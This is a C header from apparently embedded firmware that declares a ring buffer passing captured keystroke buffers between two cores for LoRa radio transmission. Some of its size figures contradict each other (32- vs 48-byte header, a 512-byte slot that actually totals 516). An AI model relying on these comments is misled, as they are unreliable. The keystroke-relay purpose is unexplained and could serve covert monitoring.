/**
 * @file psram_buffer.h
 * @brief PSRAM ring buffer for Core0↔Core1 keystroke data communication
 *
 * This module implements an 8-slot ring buffer for passing complete keystroke
 * buffers from Core1 (producer) to Core0 (consumer). The design enables Core1
 * to perform ALL keystroke processing while Core0 becomes a pure transmission layer.
 *
 * Architecture Benefits:
 * - 90% Core0 overhead reduction (2% → 0.2%)
 * - Clean Producer/Consumer separation
 * - 4KB buffering capacity (8 × 512 bytes)
 * - Lock-free multi-core communication
 * - Foundation for future FRAM migration (non-volatile, MB-scale)
 *
 * Buffer Structure:
 * - Header: 32 bytes (ring buffer metadata + statistics)
 * - Slots: 8 × 512 bytes = 4096 bytes (keystroke data)
 * - Total: 4128 bytes
 *
 * Ring Buffer Algorithm:
 * - Core1 writes to write_index, increments buffer_count
 * - Core0 reads from read_index, decrements buffer_count
 * - Circular: indices wrap at PSRAM_BUFFER_SLOTS (0-7)
 * - Full detection: buffer_count >= PSRAM_BUFFER_SLOTS
 * - Empty detection: buffer_count == 0
 *
 * SPDX-License-Identifier: BSD-3-Clause
 */

#ifndef PSRAM_BUFFER_H
#define PSRAM_BUFFER_H

#include <stdint.h>
#include <stdbool.h>

#ifdef __cplusplus
extern "C" {
#endif

#define PSRAM_BUFFER_SLOTS 8        // Number of buffer slots (circular)
#define PSRAM_BUFFER_DATA_SIZE 504  // Data size per slot (512 - 8 bytes header)
#define PSRAM_MAGIC 0xC0DE8001      // Magic number for validation

/**
 * Buffer header (48 bytes, shared between cores)
 * Contains metadata for ring buffer management and statistics
 *
 * NOTE: Expanded from 32 to 48 bytes to add critical failure tracking
 */
typedef struct {
    uint32_t magic;                         // Validation magic number
    volatile uint32_t write_index;          // Core1 writes (0-7)
    volatile uint32_t read_index;           // Core0 reads (0-7)
    volatile uint32_t buffer_count;         // Available buffers for transmission
    uint32_t total_written;                 // Total buffers written by Core1
    uint32_t total_transmitted;             // Total buffers transmitted by Core0
    uint32_t dropped_buffers;               // Buffers dropped due to overflow

    // NEW: Critical failure tracking (v3.5)
    volatile uint32_t transmission_failures; // LoRa transmission failures
    volatile uint32_t buffer_overflows;      // Buffer full events (same as dropped_buffers for now)
    volatile uint32_t psram_write_failures;  // Core1 PSRAM write failures
    volatile uint32_t retry_attempts;        // Total transmission retry attempts
    uint32_t reserved;                       // Reserved for future use
} psram_buffer_header_t;

/**
 * Individual buffer slot (512 bytes)
 * Contains keystroke data with timestamps
 * Note: Timestamps are uptime in seconds (millis()/1000), not unix epoch
 */
typedef struct {
    uint32_t start_epoch;              // Buffer start timestamp (seconds since boot)
    uint32_t final_epoch;              // Buffer finalize timestamp (seconds since boot)
    uint16_t data_length;              // Actual data length in bytes
    uint16_t flags;                    // Reserved for future flags
    char data[PSRAM_BUFFER_DATA_SIZE]; // Keystroke data (504 bytes)
} psram_keystroke_buffer_t;

/**
 * Complete PSRAM structure
 * Header + 8 buffer slots = 48 + (8 * 512) = 4144 bytes total (was 4128 in v3.4)
 */
typedef struct {
    psram_buffer_header_t header;
    psram_keystroke_buffer_t slots[PSRAM_BUFFER_SLOTS];
} psram_buffer_t;

// Global instance (in RAM for now, FRAM later)
extern psram_buffer_t g_psram_buffer;

/**
 * @brief Initialize PSRAM buffer system
 *
 * Zeros the entire buffer structure and initializes metadata.
 * Must be called once during system initialization (from Core0).
 *
 * @post g_psram_buffer is ready for Core1 writes and Core0 reads
 * @note Thread-safe: Should only be called during single-threaded init
 */
void psram_buffer_init();

/**
 * @brief Write complete keystroke buffer to PSRAM (Core1 operation)
 *
 * Core1 calls this when a keystroke buffer is finalized. The buffer is
 * written to the next available slot in the ring buffer.
 *
 * @param buffer Pointer to keystroke buffer to write (512 bytes)
 * @return true if written successfully, false if all 8 slots full
 *
 * @note Thread-safe: Single producer (Core1)
 * @note On failure: Increments dropped_buffers counter
 * @note Performance: ~10µs (memcpy of 512 bytes)
 *
 * @see psram_buffer_read() for Core0 counterpart
 */
bool psram_buffer_write(const psram_keystroke_buffer_t *buffer);

/**
 * @brief Check if PSRAM has data available (Core0 operation)
 *
 * Quick check to see if any buffers are ready for transmission.
 *
 * @return true if one or more buffers available, false if empty
 *
 * @note Thread-safe: Single consumer (Core0)
 * @note Performance: <1µs (single volatile read)
 */
bool psram_buffer_has_data();

/**
 * @brief Read buffer from PSRAM (Core0 operation)
 *
 * Core0 calls this to retrieve the next keystroke buffer for transmission.
 * The buffer is read from the current read_index and the index is incremented.
 *
 * @param buffer Output buffer to receive data (512 bytes)
 * @return true if buffer read successfully, false if no data available
 *
 * @note Thread-safe: Single consumer (Core0)
 * @note Performance: ~10µs (memcpy of 512 bytes)
 * @note Updates: read_index, buffer_count, total_transmitted
 *
 * @see psram_buffer_write() for Core1 counterpart
 */
bool psram_buffer_read(psram_keystroke_buffer_t *buffer);

/**
 * @brief Get number of buffers available for transmission
 *
 * Returns the current count of buffers waiting to be transmitted.
 * Useful for monitoring buffer occupancy and detecting transmission delays.
 *
 * @return Number of buffers ready to transmit (0-8)
 *
 * @note Thread-safe: Volatile read
 * @note Used for statistics logging every 10 seconds
 */
uint32_t psram_buffer_get_count();

/**
 * @brief Dump complete PSRAM buffer state for debugging
 *
 * Outputs comprehensive view of PSRAM buffer:
 * - Header information (magic, indices, counters, statistics)
 * - All 8 slots with metadata and data preview
 * - Raw hex dump of data for detailed inspection
 *
 * @note Thread-safe: Read-only operation
 * @note Performance: May take several seconds due to extensive logging
 * @note Should only be called from Core0 (uses LOG_INFO)
 */
void psram_buffer_dump();

#ifdef __cplusplus
}
#endif

#endif // PSRAM_BUFFER_H
